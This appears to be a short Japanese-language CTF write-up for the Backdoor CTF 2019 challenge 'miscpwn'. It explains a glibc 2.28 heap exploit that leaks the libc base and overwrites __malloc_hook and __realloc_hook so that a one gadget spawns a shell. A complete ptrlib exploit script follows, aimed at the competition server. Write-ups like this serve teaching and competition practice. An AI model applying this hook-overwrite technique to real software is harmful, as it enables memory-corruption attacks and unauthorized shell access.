# [pwn 405pts] miscpwn - Backdoor CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f miscpwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               2       miscpwn
```
この問題は競技中に（私は参加していませんでしたが）お友達から解いて〜って連絡が来て解いた問題です。任意サイズmallocできてそこから指定のオフセットに0x10バイト書き込めるという、どこぞのHITCONで見覚えのある内容になっていますが、やることは全然違います。
とりあえず巨大サイズを確保してlibcに隣接させるのは一緒なのですが、プログラムの最後にmallocされるので`__malloc_hook`を書き換えます。（`_exit`が使われているのでrtldは使えません。）
ここでlibc-2.28が使われているのですが、one gadgetは2.27と似ていて`rcx == NULL`、`[rsp+0x40] == NULL`、`[rsp+0x70] == NULL`のいずれかです。とりあえず`__malloc_hook`ではone gadgetを呼び出しても条件に当てはまるものがありあせん。そこで`__malloc_hook`に`realloc`が使われるような場所を設定し、`__realloc_hook`にone gadgetを設置します。libc-2.28では`svc_run`に確実に`[rsp+0x40]`をNULLにしてreallocを呼び出してくれる箇所が存在することが知られているので、これを使って呼び出しましょう。
```python
from ptrlib import *

#"""
libc = ELF("./libc.so.6")
one_gadget = [0x50186, 0x501e3, 0x103f50]
target = 0x14900a
sock = Socket("51.158.118.84", 17004)
"""
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./miscpwn")
#"""

# libc leak
sock.sendlineafter(":\n", str(0x300000))
base_addr = int(sock.recvline(), 16)
libc_base = base_addr + 0x300ff0
logger.info("libc base = " + hex(libc_base))

# overwrite
offset = libc_base + libc.symbol("__realloc_hook") - base_addr
sock.sendlineafter(":\n", hex(offset)[2:])

#payload  = p64(libc_base + one_gadget[0])
#payload += p64(libc_base + target)
payload  = p64(libc_base + 0x501e3)
payload += p64(libc_base + 0x105ae0)
sock.sendafter(":\n", payload)

sock.interactive()
```

# 感想
まさに知っていたら解けるmiscpwnですね。
